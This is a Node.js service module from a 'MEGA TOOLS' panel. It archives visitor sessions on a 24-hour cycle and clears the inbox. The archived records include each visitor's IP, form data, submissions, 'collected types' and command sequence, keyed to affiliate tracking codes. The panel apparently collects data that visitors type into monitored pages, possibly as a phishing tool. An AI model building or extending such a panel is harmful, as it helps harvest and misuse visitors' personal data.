// ============================================================
// MEGA TOOLS — AUTO TRUST SERVICE (v6.0 Production Hardened)
// ============================================================

const db = require('../database');
const CONFIG = require('../config');
const { toStringId, generateId } = require('../utils/helpers');
const { getSessionSockets } = require('./sessionManager');

const AUTO_TRUST_INTERVAL = 10 * 1000;
const TIMER_EMIT_INTERVAL = 60 * 1000;
const CYCLE_DURATION_MS = CONFIG.CYCLE_DURATION_MS || 24 * 60 * 60 * 1000;

let autoTrustTimer = null;
let timerEmitTimer = null;
let ioInstance = null;
let isArchiving = false;

// ============================================================
// SET IO INSTANCE
// ============================================================

function setIo(io) {
  ioInstance = io;
}

// ============================================================
// FIND MATCHED USER
// ============================================================

async function findMatchedUser(session) {
  if (!session || !session.trackingCode) return null;
  const allUsers = await db.users.read();
  const sessionTc = session.trackingCode;
  const baseTc = sessionTc.includes('_') ? sessionTc.split('_')[0] : sessionTc;

  const matchedUser = allUsers.find(u => {
    const userTc = u.trackingCode || '';
    return userTc && (baseTc === userTc || sessionTc === userTc);
  });

  return matchedUser || null;
}

// ============================================================
// SAVE TO TRUST — Full Information Snapshot
// ============================================================

async function saveToTrust(session, cycleId, deletedByUserId = null) {
  const matchedUser = await findMatchedUser(session);
  const isUserTrust = !!matchedUser;
  const trustId = generateId('t');

  const newTrust = {
    _id: trustId,
    trustId: trustId,
    archivedAt: new Date().toISOString(),
    deletedBy: deletedByUserId ? toStringId(deletedByUserId) : (isUserTrust ? toStringId(matchedUser._id) : 'system_auto'),
    deletedByRole: isUserTrust ? matchedUser.role : 'owner',
    ownerId: isUserTrust ? toStringId(matchedUser._id) : 'owner',
    userId: isUserTrust ? toStringId(matchedUser._id) : null,
    cycleId: cycleId || null,
    sessionId: session._id || null,
    visitorId: session.visitorId || null,
    trackingCode: session.trackingCode || null,
    snapshot: {
      deviceType: session.deviceType || 'Desktop',
      browser: (session.browser || '').substring(0, 200),
      ip: session.ip || '',
      clicks: session.clicks || 0,
      submissionsCount: (session.submissions || []).length,
      submissions: session.submissions || [],
      formData: session.formData || {},
      collectedTypes: session.collectedTypes || [],
      lockedKeys: session.lockedKeys || [],
      firstSeen: session.timestamp || session.created_at || '',
      lastActivity: session.lastActivity || session.timestamp || '',
      entryUrl: session.entryUrl || '',
      currentUrl: session.currentUrl || '',
      commandSeq: session.commandSeq || 0,
      identitySource: session.identitySource || 'archived',
    }
  };

  // Use proper db collection accessor (MongoDB-aware)
  const trustCollection = isUserTrust ? db.user_trust : db.owner_trust;
  const allTrust = await trustCollection.read();
  allTrust.push(newTrust);
  await trustCollection.write(allTrust);

  return newTrust;
}

// ============================================================
// TIMER EMIT — প্রতি 1 মিনিটে Frontend-এ countdown update
// ============================================================

async function emitTimerUpdate() {
  try {
    const cycle = await db.getActiveCycle();
    if (cycle && ioInstance) {
      const remainingMs = new Date(cycle.expiresAt).getTime() - Date.now();
      ioInstance.emit('cycle_timer_update', {
        expiresAt: cycle.expiresAt,
        remainingMs: remainingMs > 0 ? remainingMs : 0,
        serverTime: Date.now(),
      });
    }
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) {
      console.error('[AutoTrust] Timer emit error:', err.message);
    }
  }
}

// ============================================================
// GLOBAL CYCLE ARCHIVE — Automatic Expiration Only
// ============================================================

async function autoArchivePass() {
  if (isArchiving) return;

  try {
    let cycle = await db.getActiveCycle();

    if (!cycle) {
      cycle = await db.createCycle();
      if (!CONFIG.IS_PRODUCTION) {
        console.log(`[AutoTrust] New cycle started: ${cycle.cycleId}`);
      }
      if (ioInstance) ioInstance.emit('cycle_timer_update', { expiresAt: cycle.expiresAt, serverTime: Date.now() });
      return;
    }

    if (Date.now() < new Date(cycle.expiresAt).getTime()) {
      return;
    }

    isArchiving = true;
    const sessions = await db.sessions.read();
    let archived = 0;

    for (const session of sessions) {
      if (session.hiddenForAll) continue;
      await saveToTrust(session, cycle.cycleId);
      archived++;
    }

    await db.sessions.write([]);

    const sessionSockets = getSessionSockets();
    if (sessionSockets) {
      for (const key of Object.keys(sessionSockets)) {
        delete sessionSockets[key];
      }
    }

    await db.completeCycle(cycle.cycleId);
    const newCycle = await db.createCycle();

    if (ioInstance) {
      ioInstance.emit('cycle_completed', {
        oldCycleId: cycle.cycleId,
        newCycleId: newCycle.cycleId,
        expiresAt: newCycle.expiresAt,
        serverTime: Date.now(),
      });
    }

    if (!CONFIG.IS_PRODUCTION) {
      console.log(`[AutoTrust] Cycle ${cycle.cycleId} completed — Inbox cleared, ${archived} archived`);
    }
  } catch (err) {
    if (!CONFIG.IS_PRODUCTION) {
      console.error('[AutoTrust] Archive pass error:', err.message);
    }
  } finally {
    isArchiving = false;
  }
}

// ============================================================
// MANUAL DELETE ALL — Archive + Cleanup, Timer PRESERVED
// ============================================================

async function manualDeleteAll(ownerId) {
  const cycle = await db.getActiveCycle();
  const cycleId = cycle ? cycle.cycleId : ('manual_' + Date.now());

  const sessions = await db.sessions.read();
  let archived = 0;

  for (const session of sessions) {
    if (session.hiddenForAll) continue;
    await saveToTrust(session, cycleId, ownerId);
    archived++;
  }

  await db.sessions.write([]);

  const sessionSockets = getSessionSockets();
  if (sessionSockets) {
    for (const key of Object.keys(sessionSockets)) {
      delete sessionSockets[key];
    }
  }

  const activeCycle = await db.getActiveCycle();

  if (ioInstance) {
    ioInstance.emit('inbox_cleared', {
      deletedCount: archived,
      expiresAt: activeCycle ? activeCycle.expiresAt : null,
      serverTime: Date.now(),
    });
  }

  return { archived, cycleId, expiresAt: activeCycle ? activeCycle.expiresAt : null };
}

// ============================================================
// START / STOP
// ============================================================

function startAutoTrust() {
  if (autoTrustTimer) return;

  if (!CONFIG.IS_PRODUCTION) {
    console.log('[AutoTrust] 24h Global Inbox Cycle started (10s check + 1min timer emit)');
  }

  autoTrustTimer = setInterval(autoArchivePass, AUTO_TRUST_INTERVAL);
  setTimeout(autoArchivePass, 5000);

  timerEmitTimer = setInterval(emitTimerUpdate, TIMER_EMIT_INTERVAL);
  setTimeout(emitTimerUpdate, 1000);
}

function stopAutoTrust() {
  if (autoTrustTimer) {
    clearInterval(autoTrustTimer);
    autoTrustTimer = null;
  }
  if (timerEmitTimer) {
    clearInterval(timerEmitTimer);
    timerEmitTimer = null;
  }
  if (!CONFIG.IS_PRODUCTION) {
    console.log('[AutoTrust] Stopped');
  }
}

module.exports = { startAutoTrust, stopAutoTrust, autoArchivePass, saveToTrust, setIo, manualDeleteAll, emitTimerUpdate };